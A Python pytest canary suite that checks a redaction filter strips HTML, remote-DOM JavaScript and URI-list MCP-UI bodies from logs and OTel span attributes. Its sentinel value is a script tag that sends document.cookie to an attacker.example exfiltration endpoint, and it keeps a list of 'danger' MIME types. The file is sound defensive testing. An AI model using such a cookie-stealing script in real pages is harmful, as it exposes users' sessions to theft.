"""Canary: sentinel ``<script>`` tag never appears in logs after redaction.

bd:python-factory-0x2jq sentinel test. If this file fails, we have
reintroduced the T9 information-disclosure regression and
``bd:python-factory-lo1g9.4`` MUST NOT ship until it is fixed.

Threat T9 verdict: ``d580bfdd-8928-47a4-8d73-a899328e128e``.

Covers:

* ``redact_mcp_ui_block`` pure-fn behaviour (per-MIME danger list).
* ``redact_mcp_ui_in_otel_attributes`` for OTel exporter wrappers.
* ``MCPUIRedactionFilter`` end-to-end via stdlib ``logging``.
* Pass-through for plain ``TextContent`` / image content.
"""
from __future__ import annotations

import json
import logging

import pytest

from factory.agent.runtime.observability.mcp_ui_redaction import (
    MCPUIRedactionFilter,
    install_mcp_ui_redaction,
    redact_mcp_ui_block,
    redact_mcp_ui_in_otel_attributes,
)

# The literal we hunt for. If it survives any logging path, the test fails.
SENTINEL = (
    "<script>fetch('https://attacker.example/exfil', "
    "{body: document.cookie})</script>"
)


# --- pure block-level redaction ---------------------------------------------


def test_redact_html_body_removes_text():
    """Bare ``text/html`` MIME — full text must be replaced by digest."""
    block = {
        "text": SENTINEL,
        "uri": "ui://github/issue/123",
        "mimeType": "text/html;profile=mcp-app",
    }
    result = redact_mcp_ui_block(block)
    assert SENTINEL not in str(result)
    assert result["uri"] == "ui://github/issue/123"
    assert result["mimeType"] == "text/html;profile=mcp-app"
    assert "size" in result
    assert "sha256" in result
    # 64-char hex sha256 digest
    assert len(result["sha256"]) == 64
    assert "text" not in result
    assert result["_factory_redacted"] == "mcp-ui-body"


def test_redact_remote_dom_body():
    """``application/vnd.mcp-ui.remote-dom+javascript`` MIME — danger."""
    block = {
        "text": SENTINEL,
        "uri": "ui://factory/foo",
        "mimeType": "application/vnd.mcp-ui.remote-dom+javascript",
    }
    result = redact_mcp_ui_block(block)
    assert SENTINEL not in str(result)
    assert "text" not in result
    assert result["mimeType"] == (
        "application/vnd.mcp-ui.remote-dom+javascript"
    )


def test_redact_external_url_body():
    """``text/uri-list`` MIME — attacker URL in body must not survive."""
    block = {
        "text": "https://attacker.example/path",
        "uri": "ui://github/dashboard",
        "mimeType": "text/uri-list",
    }
    result = redact_mcp_ui_block(block)
    assert "attacker.example" not in str(result)
    assert "text" not in result


def test_non_mcp_ui_block_passes_through():
    """Plain TextContent — no mimeType, harmless. Pass through unchanged."""
    block = {"text": "Hello world"}
    result = redact_mcp_ui_block(block)
    assert result == block


def test_text_plain_passes_through():
    """``text/plain`` MIME — not in danger list, pass through unchanged."""
    block = {"text": "Hello world", "mimeType": "text/plain"}
    result = redact_mcp_ui_block(block)
    assert result == block


def test_image_block_passes_through():
    """Image content — different threat profile, different mitigation."""
    block = {
        "image": {"format": "png", "source": {"bytes": b"x"}},
        "uri": "ui://...",
        "mimeType": "image/png",
    }
    result = redact_mcp_ui_block(block)
    # We focus on text-body bodies; image bytes are out of scope here.
    assert "image" in result


def test_non_dict_block_passes_through():
    """Strings / lists / scalars are not blocks — pass through."""
    assert redact_mcp_ui_block("just a string") == "just a string"
    assert redact_mcp_ui_block(None) is None
    assert redact_mcp_ui_block(42) == 42


def test_block_without_text_field_passes_through():
    """Danger MIME but no ``text`` field — nothing to redact."""
    block = {"uri": "ui://x", "mimeType": "text/html", "type": "resource"}
    result = redact_mcp_ui_block(block)
    assert result == block


# --- nested / envelope shapes -----------------------------------------------


def test_redact_inside_tool_result_envelope():
    """``ToolResult`` ``{content: [...]}`` envelope walked recursively."""
    payload = {
        "tool_result": {
            "status": "success",
            "toolUseId": "abc-123",
            "content": [
                {
                    "text": SENTINEL,
                    "uri": "ui://x",
                    "mimeType": "text/html;profile=mcp-app",
                },
                {"text": "Plain follow-up message"},
            ],
        }
    }
    redacted = redact_mcp_ui_in_otel_attributes(
        {"tool.result": json.dumps(payload)}
    )
    assert SENTINEL not in redacted["tool.result"]
    # Plain text alongside the redacted block survives.
    assert "Plain follow-up message" in redacted["tool.result"]


def test_otel_attributes_passes_non_string_through():
    """Numeric / bool span attrs untouched."""
    attrs = {"latency_ms": 12.5, "success": True, "count": 3}
    result = redact_mcp_ui_in_otel_attributes(attrs)
    assert result == attrs


# --- end-to-end via stdlib logging ------------------------------------------


def test_logger_filter_redacts_args(caplog):
    """``logger.info("got %s", payload)`` must not leak the sentinel."""
    install_mcp_ui_redaction()
    log = logging.getLogger("test_canary_args")
    log.addFilter(MCPUIRedactionFilter())

    payload = {
        "tool_result": {
            "content": [
                {
                    "text": SENTINEL,
                    "uri": "ui://x/y",
                    "mimeType": "text/html;profile=mcp-app",
                }
            ]
        }
    }
    with caplog.at_level(logging.DEBUG):
        log.info("tool result: %s", payload)

    full_log = " ".join(r.getMessage() for r in caplog.records)
    assert SENTINEL not in full_log, (
        "SENTINEL leaked through logger args path — T9 regression. "
        f"Got: {full_log[:500]}"
    )


def test_logger_filter_redacts_msg_json_dump(caplog):
    """``logger.info(json.dumps(payload))`` (raw msg) must not leak."""
    log = logging.getLogger("test_canary_msg")
    log.addFilter(MCPUIRedactionFilter())

    payload = {
        "content": [
            {
                "text": SENTINEL,
                "uri": "ui://x",
                "mimeType": "text/html;profile=mcp-app",
            }
        ]
    }
    with caplog.at_level(logging.DEBUG):
        log.info(json.dumps(payload))

    full_log = " ".join(r.getMessage() for r in caplog.records)
    assert SENTINEL not in full_log, (
        "SENTINEL leaked through logger msg JSON path. "
        f"Got: {full_log[:500]}"
    )


def test_logger_filter_redacts_remote_dom_mime(caplog):
    """``application/vnd.mcp-ui.*`` MIME must be redacted at log-emit."""
    log = logging.getLogger("test_canary_remote_dom")
    log.addFilter(MCPUIRedactionFilter())

    payload = {
        "uri": "ui://factory/widget",
        "mimeType": "application/vnd.mcp-ui.remote-dom+javascript",
        "text": SENTINEL,
    }
    with caplog.at_level(logging.DEBUG):
        log.info("paint: %s", payload)

    full_log = " ".join(r.getMessage() for r in caplog.records)
    assert SENTINEL not in full_log


def test_logger_filter_passes_plain_text_through(caplog):
    """Plain text logs without danger MIME survive untouched."""
    log = logging.getLogger("test_canary_plain")
    log.addFilter(MCPUIRedactionFilter())

    plain_payload = {"content": [{"text": "ordinary tool output"}]}
    with caplog.at_level(logging.DEBUG):
        log.info("plain: %s", plain_payload)

    full_log = " ".join(r.getMessage() for r in caplog.records)
    assert "ordinary tool output" in full_log


def test_install_is_idempotent():
    """Calling ``install_mcp_ui_redaction`` twice does not double-attach."""
    install_mcp_ui_redaction()
    install_mcp_ui_redaction()
    install_mcp_ui_redaction()
    root = logging.getLogger()
    named = [f for f in root.filters
             if getattr(f, "name", "") == "mcp_ui_redaction"]
    assert len(named) == 1


def test_filter_never_drops_records(caplog):
    """Filter returns True even on malformed/edge input."""
    log = logging.getLogger("test_canary_robust")
    log.addFilter(MCPUIRedactionFilter())
    with caplog.at_level(logging.DEBUG):
        log.info("plain message")
        log.info("with args: %s", 42)
        log.info("with multi-args: %s %s", "a", "b")
        log.info({"raw": "dict-as-msg"})  # type: ignore[arg-type]
    # All 4 records present.
    assert len(caplog.records) == 4


@pytest.mark.parametrize("mime", [
    "text/html",
    "text/html;profile=mcp-app",
    "text/html; charset=utf-8",
    "TEXT/HTML",  # case-insensitive
    "application/vnd.mcp-ui.remote-dom+javascript",
    "application/vnd.mcp-ui.iframe-html",
    "text/uri-list",
])
def test_danger_mime_variants_all_redacted(mime):
    """Every danger-list MIME variant strips the body."""
    block = {"text": SENTINEL, "uri": "ui://x", "mimeType": mime}
    result = redact_mcp_ui_block(block)
    assert "text" not in result
    assert SENTINEL not in str(result)


@pytest.mark.parametrize("mime", [
    "text/plain",
    "application/json",
    "image/png",
    "text/markdown",
])
def test_safe_mime_variants_pass_through(mime):
    """Non-danger MIMEs leave the block unchanged."""
    block = {"text": "harmless content", "mimeType": mime}
    result = redact_mcp_ui_block(block)
    assert result == block
